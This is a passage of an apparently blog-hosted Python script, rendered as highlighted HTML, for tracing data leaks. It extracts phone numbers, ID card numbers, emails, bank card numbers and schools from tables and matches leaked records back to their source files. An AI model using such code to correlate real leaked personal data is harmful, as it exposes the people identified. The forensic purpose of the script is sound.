class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">import</span> json<br>data = &#123;&#125;<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    filename: &#123;</span><br><span class="hljs-string">        data: [],</span><br><span class="hljs-string">        meta: &#123;</span><br><span class="hljs-string">            header: [],</span><br><span class="hljs-string">            filename: &#x27;&#x27;,</span><br><span class="hljs-string">            length: 0</span><br><span class="hljs-string">        &#125;,</span><br><span class="hljs-string">        p_phone: &#123;&#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>varibs = [<span class="hljs-string">&#x27;phone&#x27;</span>, <span class="hljs-string">&#x27;cert_no&#x27;</span>, <span class="hljs-string">&#x27;school&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;bank_card&#x27;</span>]<br>result = []<br>valid_phone_prefix = [<span class="hljs-number">334</span>,<span class="hljs-number">335</span>,<span class="hljs-number">336</span>,<span class="hljs-number">337</span>,<span class="hljs-number">338</span>,<span class="hljs-number">339</span>,<span class="hljs-number">347</span>,<span class="hljs-number">350</span>,<span class="hljs-number">351</span>,<span class="hljs-number">352</span>,<span class="hljs-number">357</span>,<span class="hljs-number">358</span>,<span class="hljs-number">359</span>,<span class="hljs-number">378</span>,<span class="hljs-number">382</span>,<span class="hljs-number">383</span>,<span class="hljs-number">384</span>,<span class="hljs-number">387</span>,<span class="hljs-number">388</span>,<span class="hljs-number">330</span>,<span class="hljs-number">331</span>,<span class="hljs-number">332</span>,<span class="hljs-number">345</span>,<span class="hljs-number">355</span>,<span class="hljs-number">356</span>,<span class="hljs-number">385</span>,<span class="hljs-number">386</span>,<span class="hljs-number">376</span>,<span class="hljs-number">375</span>,<span class="hljs-number">333</span>,<span class="hljs-number">349</span>,<span class="hljs-number">353</span>,<span class="hljs-number">380</span>,<span class="hljs-number">381</span>,<span class="hljs-number">389</span>,<span class="hljs-number">377</span>,<span class="hljs-number">399</span>,<span class="hljs-number">391</span>,<span class="hljs-number">393</span>,<span class="hljs-number">395</span>,<span class="hljs-number">398</span>]<br>valid_bank_card_prefix = [<span class="hljs-number">922</span>,<span class="hljs-number">883</span>,<span class="hljs-number">165</span>,<span class="hljs-number">221</span>,<span class="hljs-number">880</span>,<span class="hljs-number">584</span>,<span class="hljs-number">768</span>,<span class="hljs-number">908</span>,<span class="hljs-number">197</span>,<span class="hljs-number">130</span>,<span class="hljs-number">956</span>,<span class="hljs-number">500</span>,<span class="hljs-number">723</span>,<span class="hljs-number">881</span>,<span class="hljs-number">886</span>,<span class="hljs-number">839</span>,<span class="hljs-number">922</span>,<span class="hljs-number">335</span>,<span class="hljs-number">706</span>,<span class="hljs-number">205</span>,<span class="hljs-number">132</span>,<span class="hljs-number">123</span>,<span class="hljs-number">127</span>,<span class="hljs-number">766</span>,<span class="hljs-number">110</span>,<span class="hljs-number">803</span>,<span class="hljs-number">322</span>,<span class="hljs-number">844</span>,<span class="hljs-number">130</span>,<span class="hljs-number">641</span>,<span class="hljs-number">328</span>,<span class="hljs-number">883</span>,<span class="hljs-number">667</span>,<span class="hljs-number">339</span>,<span class="hljs-number">337</span>,<span class="hljs-number">794</span>,<span class="hljs-number">325</span>,<span class="hljs-number">880</span>,<span class="hljs-number">571</span>,<span class="hljs-number">397</span>,<span class="hljs-number">123</span>,<span class="hljs-number">958</span>,<span class="hljs-number">758</span>,<span class="hljs-number">203</span>,<span class="hljs-number">291</span>,<span class="hljs-number">745</span>,<span class="hljs-number">842</span>,<span class="hljs-number">981</span>,<span class="hljs-number">224</span>,<span class="hljs-number">861</span>,<span class="hljs-number">839</span>,<span class="hljs-number">613</span>,<span class="hljs-number">950</span>,<span class="hljs-number">787</span>,<span class="hljs-number">295</span>,<span class="hljs-number">391</span>,<span class="hljs-number">702</span>,<span class="hljs-number">612</span>,<span class="hljs-number">967</span>,<span class="hljs-number">618</span>,<span class="hljs-number">704</span>,<span class="hljs-number">974</span>,<span class="hljs-number">136</span>,<span class="hljs-number">592</span>,<span class="hljs-number">862</span>,<span class="hljs-number">917</span>,<span class="hljs-number">781</span>,<span class="hljs-number">278</span>,<span class="hljs-number">662</span>,<span class="hljs-number">895</span>,<span class="hljs-number">791</span>,<span class="hljs-number">856</span>,<span class="hljs-number">189</span>,<span class="hljs-number">780</span>,<span class="hljs-number">211</span>,<span class="hljs-number">898</span>,<span class="hljs-number">268</span>,<span class="hljs-number">961</span>,<span class="hljs-number">851</span>,<span class="hljs-number">131</span>,<span class="hljs-number">581</span>,<span class="hljs-number">145</span>,<span class="hljs-number">969</span>,<span class="hljs-number">730</span>,<span class="hljs-number">708</span>,<span class="hljs-number">693</span>,<span class="hljs-number">763</span>,<span class="hljs-number">275</span>,<span class="hljs-number">273</span>,<span class="hljs-number">615</span>,<span class="hljs-number">333</span>,<span class="hljs-number">113</span>,<span class="hljs-number">890</span>,<span class="hljs-number">981</span>,<span class="hljs-number">662</span>,<span class="hljs-number">338</span>,<span class="hljs-number">692</span>,<span class="hljs-number">571</span>,<span class="hljs-number">776</span>,<span class="hljs-number">662</span>,<span class="hljs-number">724</span>,<span class="hljs-number">847</span>,<span class="hljs-number">106</span>,<span class="hljs-number">903</span>,<span class="hljs-number">978</span>,<span class="hljs-number">941</span>,<span class="hljs-number">859</span>,<span class="hljs-number">929</span>,<span class="hljs-number">233</span>,<span class="hljs-number">632</span>,<span class="hljs-number">897</span>,<span class="hljs-number">158</span>,<span class="hljs-number">593</span>,<span class="hljs-number">991</span>,<span class="hljs-number">684</span>,<span class="hljs-number">668</span>,<span class="hljs-number">617</span>,<span class="hljs-number">597</span>,<span class="hljs-number">933</span>,<span class="hljs-number">102</span>,<span class="hljs-number">739</span>,<span class="hljs-number">906</span>,<span class="hljs-number">728</span>,<span class="hljs-number">570</span>,<span class="hljs-number">715</span>,<span class="hljs-number">129</span>,<span class="hljs-number">924</span>,<span class="hljs-number">336</span>,<span class="hljs-number">751</span>,<span class="hljs-number">282</span>,<span class="hljs-number">699</span>,<span class="hljs-number">286</span>,<span class="hljs-number">982</span>,<span class="hljs-number">194</span>,<span class="hljs-number">918</span>,<span class="hljs-number">665</span>,<span class="hljs-number">917</span>,<span class="hljs-number">972</span>,<span class="hljs-number">937</span>,<span class="hljs-number">134</span>,<span class="hljs-number">962</span>,<span class="hljs-number">790</span>,<span class="hljs-number">173</span>,<span class="hljs-number">186</span>,<span class="hljs-number">118</span>,<span class="hljs-number">115</span>,<span class="hljs-number">873</span>,<span class="hljs-number">874</span>,<span class="hljs-number">388</span>,<span class="hljs-number">213</span>,<span class="hljs-number">917</span>,<span class="hljs-number">740</span>,<span class="hljs-number">290</span>,<span class="hljs-number">398</span>,<span class="hljs-number">172</span>,<span class="hljs-number">272</span>,<span class="hljs-number">264</span>,<span class="hljs-number">641</span>,<span class="hljs-number">273</span>,<span class="hljs-number">773</span>,<span class="hljs-number">380</span>,<span class="hljs-number">764</span>,<span class="hljs-number">586</span>,<span class="hljs-number">217</span>,<span class="hljs-number">125</span>,<span class="hljs-number">916</span>,<span class="hljs-number">293</span>,<span class="hljs-number">212</span>,<span class="hljs-number">848</span>,<span class="hljs-number">721</span>,<span class="hljs-number">937</span>,<span class="hljs-number">122</span>,<span class="hljs-number">331</span>,<span class="hljs-number">119</span>,<span class="hljs-number">507</span>,<span class="hljs-number">250</span>,<span class="hljs-number">137</span>,<span class="hljs-number">837</span>,<span class="hljs-number">265</span>,<span class="hljs-number">619</span>,<span class="hljs-number">795</span>,<span class="hljs-number">953</span>,<span class="hljs-number">326</span>,<span class="hljs-number">746</span>,<span class="hljs-number">917</span>,<span class="hljs-number">562</span>,<span class="hljs-number">329</span>,<span class="hljs-number">765</span>,<span class="hljs-number">132</span>,<span class="hljs-number">505</span>,<span class="hljs-number">792</span>,<span class="hljs-number">923</span>,<span class="hljs-number">776</span>,<span class="hljs-number">747</span>,<span class="hljs-number">161</span>,<span class="hljs-number">856</span>,<span class="hljs-number">229</span>,<span class="hljs-number">997</span>,<span class="hljs-number">149</span>,<span class="hljs-number">173</span>,<span class="hljs-number">980</span>,<span class="hljs-number">179</span>,<span class="hljs-number">862</span>,<span class="hljs-number">263</span>,<span class="hljs-number">679</span>,<span class="hljs-number">359</span>,<span class="hljs-number">234</span>,<span class="hljs-number">109</span>,<span class="hljs-number">971</span>,<span class="hljs-number">139</span>,<span class="hljs-number">705</span>,<span class="hljs-number">323</span>,<span class="hljs-number">684</span>,<span class="hljs-number">572</span>,<span class="hljs-number">276</span>,<span class="hljs-number">948</span>,<span class="hljs-number">991</span>,<span class="hljs-number">899</span>,<span class="hljs-number">738</span>,<span class="hljs-number">139</span>,<span class="hljs-number">306</span>,<span class="hljs-number">202</span>,<span class="hljs-number">791</span>,<span class="hljs-number">706</span>,<span class="hljs-number">299</span>,<span class="hljs-number">207</span>,<span class="hljs-number">782</span>,<span class="hljs-number">500</span>,<span class="hljs-number">617</span>,<span class="hljs-number">612</span>,<span class="hljs-number">118</span>,<span class="hljs-number">727</span>,<span class="hljs-number">993</span>,<span class="hljs-number">389</span>,<span class="hljs-number">119</span>,<span class="hljs-number">261</span>,<span class="hljs-number">306</span>,<span class="hljs-number">979</span>,<span class="hljs-number">931</span>,<span class="hljs-number">902</span>,<span class="hljs-number">239</span>,<span class="hljs-number">791</span>,<span class="hljs-number">199</span>,<span class="hljs-number">958</span>,<span class="hljs-number">661</span>,<span class="hljs-number">958</span>,<span class="hljs-number">804</span>,<span class="hljs-number">597</span>,<span class="hljs-number">887</span>,<span class="hljs-number">167</span>,<span class="hljs-number">142</span>,<span class="hljs-number">187</span>,<span class="hljs-number">237</span>,<span class="hljs-number">274</span>,<span class="hljs-number">271</span>,<span class="hljs-number">878</span>,<span class="hljs-number">715</span>,<span class="hljs-number">619</span>,<span class="hljs-number">962</span>,<span class="hljs-number">217</span>,<span class="hljs-number">399</span>,<span class="hljs-number">719</span>,<span class="hljs-number">899</span>,<span class="hljs-number">833</span>,<span class="hljs-number">239</span>,<span class="hljs-number">665</span>,<span class="hljs-number">889</span>,<span class="hljs-number">207</span>,<span class="hljs-number">141</span>,<span class="hljs-number">175</span>,<span class="hljs-number">987</span>,<span class="hljs-number">908</span>,<span class="hljs-number">251</span>,<span class="hljs-number">949</span>,<span class="hljs-number">229</span>,<span class="hljs-number">218</span>,<span class="hljs-number">730</span>,<span class="hljs-number">702</span>,<span class="hljs-number">901</span>,<span class="hljs-number">179</span>,<span class="hljs-number">330</span>,<span class="hljs-number">680</span>,<span class="hljs-number">184</span>,<span class="hljs-number">678</span>,<span class="hljs-number">218</span>,<span class="hljs-number">569</span>,<span class="hljs-number">384</span>,<span class="hljs-number">211</span>,<span class="hljs-number">906</span>,<span class="hljs-number">147</span>,<span class="hljs-number">948</span>,<span class="hljs-number">113</span>,<span class="hljs-number">729</span>,<span class="hljs-number">787</span>,<span class="hljs-number">115</span>,<span class="hljs-number">194</span>,<span class="hljs-number">218</span>,<span class="hljs-number">946</span>,<span class="hljs-number">141</span>,<span class="hljs-number">293</span>,<span class="hljs-number">701</span>,<span class="hljs-number">266</span>,<span class="hljs-number">219</span>,<span class="hljs-number">562</span>,<span class="hljs-number">272</span>,<span class="hljs-number">798</span>,<span class="hljs-number">263</span>,<span class="hljs-number">862</span>,<span class="hljs-number">206</span>,<span class="hljs-number">926</span>,<span class="hljs-number">938</span>,<span class="hljs-number">203</span>,<span class="hljs-number">768</span>,<span class="hljs-number">141</span>,<span class="hljs-number">128</span>,<span class="hljs-number">111</span>,<span class="hljs-number">906</span>,<span class="hljs-number">844</span>,<span class="hljs-number">711</span>,<span class="hljs-number">509</span>,<span class="hljs-number">165</span>,<span class="hljs-number">166</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid_cert_no</span>(<span class="hljs-params">n</span>):<br>    var = [<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>]<br>    var_id=[<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>]<br><br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">17</span>):<br>        <span class="hljs-built_in">sum</span> += <span class="hljs-built_in">int</span>(n[i])*var[i]<br>    <span class="hljs-built_in">sum</span> %= <span class="hljs-number">11</span><br><br>    <span class="hljs-keyword">return</span> var_id[<span class="hljs-built_in">sum</span>] == n[<span class="hljs-number">17</span>].lower()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">format_var</span>(<span class="hljs-params">val, <span class="hljs-built_in">format</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">format</span> == <span class="hljs-string">&#x27;phone&#x27;</span>:<br>        res = re.findall(<span class="hljs-string">&#x27;\(?\+?8?6?\)? ?(\d&#123;3&#125;).?(\d&#123;4&#125;).?(\d&#123;4&#125;)\(?8?6?\)?&#x27;</span>, val)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(res[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> val<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work_for_table</span>(<span class="hljs-params">path, filename</span>):<br>    <span class="hljs-keyword">global</span> data<br>    data[filename] = &#123;<br>        <span class="hljs-string">&#x27;data&#x27;</span>: <span class="hljs-literal">None</span>,<br>        <span class="hljs-string">&#x27;meta&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;filename&#x27;</span>: filename,<br>            <span class="hljs-string">&#x27;header&#x27;</span>: <span class="hljs-built_in">list</span>()<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        row = f.readline().strip()<br>        row = row.split(<span class="hljs-string">&#x27;,&#x27;</span>)[<span class="hljs-number">1</span>:]<br><br>        data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;header&#x27;</span>] = row.copy()<br><br>        _d = []<br><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>            line = line.strip().split(<span class="hljs-string">&#x27;,&#x27;</span>)[<span class="hljs-number">1</span>:]<br>            _d.append(line)<br>        <br>        lng = <span class="hljs-built_in">len</span>(_d)<br>        data[filename][<span class="hljs-string">&#x27;data&#x27;</span>] = _d.copy()<br>        data[filename][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;length&#x27;</span>] = lng<br>        <br>        <span class="hljs-keyword">for</span> index, item <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(row):<br>            _d = &#123;&#125;<br>            <span class="hljs-keyword">if</span> item.lower() <span class="hljs-keyword">in</span> varibs:<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(lng):<br>                    _d[format_var(data[filename][<span class="hljs-string">&#x27;data&#x27;</span>][i][index], item.lower())] = i<br>            data[filename][<span class="hljs-string">f&#x27;p_<span class="hljs-subst">&#123;item.lower()&#125;</span>&#x27;</span>] = _d.copy()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">locate_file</span>(<span class="hljs-params">val,  <span class="hljs-built_in">type</span></span>):<br>    <span class="hljs-keyword">global</span> data<br>    fval = format_var(val, <span class="hljs-built_in">type</span>)<br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> <span class="hljs-keyword">in</span> data[key][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;header&#x27;</span>]:<br>            idx = data[key][<span class="hljs-string">f&#x27;p_<span class="hljs-subst">&#123;<span class="hljs-built_in">type</span>&#125;</span>&#x27;</span>].get(fval, <span class="hljs-literal">None</span>)<br>            pos = data[key][<span class="hljs-string">&#x27;meta&#x27;</span>][<span class="hljs-string">&#x27;header&#x27;</span>].index(<span class="hljs-built_in">type</span>)<br>            <span class="hljs-keyword">if</span> idx <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">return</span> (key, <span class="hljs-built_in">type</span>, data[key][<span class="hljs-string">&#x27;data&#x27;</span>][idx][pos])<br>                <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leakwork_for_table</span>(<span class="hljs-params">path, filename</span>):<br>    <span class="hljs-keyword">global</span> result<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        row = f.readline().strip()<br>        row = row.split(<span class="hljs-string">&#x27;,&#x27;</span>)[<span class="hljs-number">1</span>:]<br><br>        _d = []<br><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>            line = line.strip().split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>            _d.append(line)<br>        lng = <span class="hljs-built_in">len</span>(_d)<br><br>        <span class="hljs-keyword">for</span> index, item <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(row):<br>            <span class="hljs-keyword">if</span> item.lower() <span class="hljs-keyword">in</span> varibs:<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(lng):<br>                    res = locate_file(_d[i][index+<span class="hljs-number">1</span>], item.lower())<br>                    <span class="hljs-keyword">if</span> res <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                        <span class="hljs-comment"># print(res)</span><br>                        result.append(<span class="hljs-string">&#x27;,&#x27;</span>.join((filename,)+res) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_content</span>(<span class="hljs-params">lines</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(lines) == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> lines[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;&#123;&#x27;</span>:<br>            lines = lines[<span class="hljs-number">0</span>].strip().split(<span class="hljs-string">&#x27; &#123;&#x27;</span>)<br>            <br>            _d = [<br>                json.loads(lines[<span class="hljs-number">0</span>])<br>            ]<br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines[<span class="hljs-number">1</span>:]:<br>                _d.append(json.loads(<span class="hljs-string">&#x27;&#123;&#x27;</span>+line))<br>            <span class="hljs-keyword">return</span> _d, <span class="hljs-string">&#x27;json&#x27;</span><br><br>        <span class="hljs-keyword">if</span> lines[<span class="hljs-number">0</span>].count(<span class="hljs-string">&#x27;。&#x27;</span>) &gt; <span class="hljs-number">100</span>:<br>            <span class="hljs-keyword">return</span> lines[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;line&#x27;</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(lines[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)) &gt; <span class="hljs-number">1</span>:<br>        header = lines[<span class="hljs-number">0</span>].strip().split(<span class="hljs-string">&#x27;   &#x27;</span>)<br>        line = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(lines)):<br>            line.append(lines[i].strip().split(<span class="hljs-string">&#x27;    &#x27;</span>))<br><br>        <span class="hljs-keyword">return</span> &#123;<br>            <span class="hljs-string">&#x27;header&#x27;</span>: header,<br>            <span class="hljs-string">&#x27;data&#x27;</span>: line,<br>        &#125;, <span class="hljs-string">&#x27;table&#x27;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(lines[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;,&#x27;</span>)) &gt; <span class="hljs-number">1</span>:<br>        header = lines[<span class="hljs-number">0</span>].strip().split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        line = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(lines)):<br>            line.append(lines[i].strip().split(<span class="hljs-string">&#x27;,&#x27;</span>))<br><br>        <span class="hljs-keyword">return</span> &#123;<br>            <span class="hljs-string">&#x27;header&#x27;</span>: header,<br>            <span class="hljs-string">&#x27;data&#x27;</span>: line,<br>        &#125;, <span class="hljs-string">&#x27;table&#x27;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(lines[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;|&#x27;</span>)) &gt; <span class="hljs-number">1</span>:<br>        header = lines[<span class="hljs-number">0</span>].strip().split(<span class="hljs-string">&#x27;|&#x27;</span>)<br>        line = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(lines)):<br>            line.append(lines[i].strip().split(<span class="hljs-string">&#x27;|&#x27;</span>))<br><br>        <span class="hljs-keyword">return</span> &#123;<br>                   <span class="hljs-string">&#x27;header&#x27;</span>: header,<br>                   <span class="hljs-string">&#x27;data&#x27;</span>: line,<br>               &#125;, <span class="hljs-string">&#x27;table&#x27;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(lines[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;:&#x27;</span>)) &gt; <span class="hljs-number">1</span>:<br>        header = lines[<span class="hljs-number">0</span>].strip().split(<span class="hljs-string">&#x27;:&#x27;</span>)<br>        line = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(lines)):<br>            line.append(lines[i].strip().split(<span class="hljs-string">&#x27;:&#x27;</span>))<br><br>        <span class="hljs-keyword">return</span> &#123;<br>                   <span class="hljs-string">&#x27;header&#x27;</span>: header,<br>                   <span class="hljs-string">&#x27;data&#x27;</span>: line,<br>               &#125;, <span class="hljs-string">&#x27;table&#x27;</span><br><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(lines[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;\t&#x27;</span>)) &gt; <span class="hljs-number">1</span>:<br>        header = lines[<span class="hljs-number">0</span>].strip().split(<span class="hljs-string">&#x27;\t&#x27;</span>)<br>        line = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(lines)):<br>            line.append(lines[i].strip().split(<span class="hljs-string">&#x27;\t&#x27;</span>))<br><br>        <span class="hljs-keyword">return</span> &#123;<br>                   <span class="hljs-string">&#x27;header&#x27;</span>: header,<br>                   <span class="hljs-string">&#x27;data&#x27;</span>: line,<br>               &#125;, <span class="hljs-string">&#x27;table&#x27;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(lines[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;;&#x27;</span>)) &gt; <span class="hljs-number">1</span>:<br>        header = lines[<span class="hljs-number">0</span>].strip().split(<span class="hljs-string">&#x27;;&#x27;</span>)<br>        line = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(lines)):<br>            line.append(lines[i].strip().split(<span class="hljs-string">&#x27;;&#x27;</span>))<br><br>        <span class="hljs-keyword">return</span> &#123;<br>                   <span class="hljs-string">&#x27;header&#x27;</span>: header,<br>                   <span class="hljs-string">&#x27;data&#x27;</span>: line,<br>               &#125;, <span class="hljs-string">&#x27;table&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_item</span>(<span class="hljs-params">val</span>):<br>    res = re.findall(<span class="hljs-string">&#x27;(\(?\+?8?6?\)? ?(\d&#123;3&#125;).?(\d&#123;4&#125;).?(\d&#123;4&#125;)\(?8?6?\)?)&#x27;</span>, val)<br><br>    <span class="hljs-keyword">if</span> res:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]) <span class="hljs-keyword">in</span> valid_phone_prefix:<br>            <span class="hljs-keyword">return</span> res[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;phone&#x27;</span><br><br>    res = re.findall(<span class="hljs-string">r&#x27;([a-zA-Z0-9_-]+(?:\.[a-zA-Z0-9_-]+)*@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*\.[a-z]&#123;2,6&#125;)&#x27;</span>, val)<br><br>    <span class="hljs-keyword">if</span> res:<br>        <span class="hljs-keyword">return</span> res[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;email&#x27;</span><br>    <br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;学校&#x27;</span>, <span class="hljs-string">&#x27;大学&#x27;</span>, <span class="hljs-string">&#x27;学院&#x27;</span>, <span 